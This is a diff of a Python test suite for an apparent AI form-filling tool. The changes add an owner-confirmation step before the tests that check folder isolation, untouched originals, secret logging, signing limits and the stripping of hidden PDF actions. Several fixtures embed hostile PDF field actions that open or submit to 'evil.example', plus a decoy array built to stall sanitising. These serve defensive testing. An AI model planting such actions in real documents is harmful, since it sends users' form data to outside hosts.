@@ -296,8 +296,12 @@ class FilledFormsGoToOneFolderOnly(PaperworkTest):
         # an original photograph — and rewrote the source while reporting it
         # 'original_untouched'.
         r = self.py("""
-            import jefferey_mcp as m, egress
+            import jefferey_mcp as m, egress, access
             os.makedirs("work"); os.chdir("work")    # '../escape.pdf' stays in the test folder
+            # (round 8 repair, S2: a box of his own details takes only what he
+            # confirmed, so he gives his name at his own console first)
+            with access.owner_console():
+                m.rep.set_profile_field("Full name", "Laszlo")
             form = make_form(os.path.abspath("form.pdf"), [{"name": "Full name"}])
             mcp_call(m, "remember_fact", {"fact": "Daughter's recital is June 12"})
             os.makedirs("library/2011-kandahar")
@@ -344,7 +348,11 @@ class FilledFormsGoToOneFolderOnly(PaperworkTest):
 
     def test_the_copy_is_always_a_new_file_and_the_original_is_untouched(self):
         r = self.py("""
-            import jefferey_mcp as m
+            import jefferey_mcp as m, access
+            # (round 8 repair, S2: a box of his own details takes only what he
+            # confirmed, so he gives his name at his own console first)
+            with access.owner_console():
+                m.rep.set_profile_field("Full name", "Laszlo")
             form = make_form("form.pdf", [{"name": "Full name"}])
             src = open(form, "rb").read()
             os.makedirs(FORMS)
@@ -404,8 +412,12 @@ class FilledFormsGoToOneFolderOnly(PaperworkTest):
     def test_every_secret_used_is_written_down_and_reported(self):
         # privacy#0: the summary report showed nothing.
         r = self.py("""
-            import jefferey_mcp as m, egress
+            import jefferey_mcp as m, egress, access
             keep_secrets(sin=%r)
+            # (round 8 repair, S2: a box of his own details takes only what he
+            # confirmed, so he gives his name at his own console first)
+            with access.owner_console():
+                m.rep.set_profile_field("Full name", "Laszlo")
             form = make_form("t1.pdf", [{"name": "Full name"}, {"name": "SIN"}])
             res = mcp_call(m, "fill_pdf", {"pdf_path": form,
                                            "values": {"Full name": "Laszlo", "SIN": "vault:sin"}})
@@ -710,7 +722,11 @@ class AFormsHiddenActionsStayOut(PaperworkTest):
 
     def test_the_filled_copy_carries_no_script_and_no_send_to_a_website(self):
         r = self.py("""
-            import jefferey_mcp as m
+            import jefferey_mcp as m, access
+            # (round 8 repair, S2: a box of his own details takes only what he
+            # confirmed, so he gives his name at his own console first)
+            with access.owner_console():
+                m.rep.set_profile_field("Full name", "Laszlo")
             form = make_form("gov.pdf", [
                 {"name": "Full name", "a_js": "app.launchURL('https://evil.example')"},
                 {"name": "Comments", "aa_submit": "https://evil.example/collect"}],
@@ -766,8 +782,12 @@ class SigningIsAnAct(PaperworkTest):
 
     def test_signing_boxes_are_refused_below_act_and_the_answer_is_logged(self):
         r = self.py("""
-            import jefferey_mcp as m
+            import jefferey_mcp as m, access
             keep_secrets(signature="/s/ Laszlo Czako")
+            # (round 8 repair, S2: a box of his own details takes only what he
+            # confirmed, so he gives his name at his own console first)
+            with access.owner_console():
+                m.rep.set_profile_field("Full name", "Laszlo Czako")
             form = make_form("t1.pdf", [{"name": "Full name"},
                                         {"name": "I certify the information is true", "ft": "/Btn"},
                                         {"name": "Signed"}, {"name": "Signature"}])
@@ -1018,7 +1038,11 @@ class AfterTheFixes(PaperworkTest):
         # I-31: one decoy field with a 600,000-item array stopped the strip
         # walk, and the copy kept a page script and a send-to-a-website
         r = self.py("""
-            import jefferey_chat as jc, representative
+            import jefferey_chat as jc, representative, access
+            # (round 8 repair, S2: a box of his own details takes only what he
+            # confirmed, so he gives his name at his own console first)
+            with access.owner_console():
+                jc.rep.set_profile_field("Full name", "L")
             form = make_form("gov.pdf", [{"name": "Decoy", "decoy": 600000},
                                          {"name": "Full name", "a_js": "app.launchURL('x')"},
                                          {"name": "Comments", "aa_submit": "https://evil.example/c"}],
